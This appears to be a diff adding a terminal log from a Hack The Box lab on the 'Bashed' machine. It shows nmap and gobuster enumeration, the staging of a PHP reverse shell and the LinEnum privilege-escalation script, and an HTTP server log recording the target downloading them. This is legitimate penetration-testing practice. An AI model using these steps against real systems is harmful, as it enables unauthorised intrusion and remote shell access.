@@ -1,0 +1,64 @@
+arjun@broly:~/Documents/HacktheBox/retired/bashed$ sudo nmap -sC -sV -oA nmap/initial 10.10.10.68   
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-16 12:32 CST                 
+Nmap scan report for 10.10.10.68        
+Host is up (0.20s latency).             
+Not shown: 999 closed ports             
+PORT   STATE SERVICE VERSION            
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                             
+|_http-server-header: Apache/2.4.18 (Ubuntu)                                    
+|_http-title: Arrexel's Development Site                                        
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .      
+Nmap done: 1 IP address (1 host up) scanned in 37.40 seconds                    
+arjun@broly:~/Documents/HacktheBox/retired/bashed$ cat nmap/initial.nmap        
+# Nmap 7.80 scan initiated Mon Dec 16 12:32:18 2019 as: nmap -sC -sV -oA nmap/initial 10.10.10.68   
+Nmap scan report for 10.10.10.68        
+Host is up (0.20s latency).             
+Not shown: 999 closed ports             
+PORT   STATE SERVICE VERSION            
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                             
+|_http-server-header: Apache/2.4.18 (Ubuntu)                                    
+|_http-title: Arrexel's Development Site                                        
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .      
+# Nmap done at Mon Dec 16 12:32:56 2019 -- 1 IP address (1 host up) scanned in 37.40 seconds        
+
+arjun@broly:~/Documents/HacktheBox/retired/bashed$ /opt/gobuster/gobuster dir -u
+ http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.
+txt                                                                             
+===============================================================                 
+Gobuster v3.0.1     
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                 
+===============================================================                 
+[+] Url:            http://10.10.10.68  
+[+] Threads:        10                  
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403                                 
+[+] User Agent:     gobuster/3.0.1      
+[+] Timeout:        10s                 
+===============================================================                 
+2019/12/16 12:44:32 Starting gobuster   
+===============================================================                 
+/images (Status: 301)                   
+/uploads (Status: 301)                  
+/php (Status: 301)  
+/css (Status: 301)  
+/dev (Status: 301)  
+/js (Status: 301)   
+/fonts (Status: 301)                    
+Progress: 17672 / 220561 (8.01%)^C      
+[!] Keyboard interrupt detected, terminating.                                   
+===============================================================                 
+2019/12/16 12:49:08 Finished            
+===============================================================                 
+arjun@broly:~/Documents/HacktheBox/retired/bashed$ cp /opt/linux_privesc/LinEnum.sh .                
+arjun@broly:~/Documents/HacktheBox/retired/bashed$ cp /opt/shell/php/php-reverse-shell.php .        
+arjun@broly:~/Documents/HacktheBox/retired/bashed$ ls                           
+LinEnum.sh  nmap  php-reverse-shell.php 
+arjun@broly:~/Documents/HacktheBox/retired/bashed$ sudo python -m SimpleHTTPServ
+er 80               
+Serving HTTP on 0.0.0.0 port 80 ...     
+10.10.10.68 - - [16/Dec/2019 16:36:10] "GET /LinEnum.sh HTTP/1.1" 200 -  
+10.10.10.68 - - [16/Dec/2019 19:53:51] "GET /php-reverse-shell.php HTTP/1.1" 200 -                  
+10.10.10.68 - - [16/Dec/2019 20:10:18] "GET /test.py HTTP/1.1" 200 -            
+                    
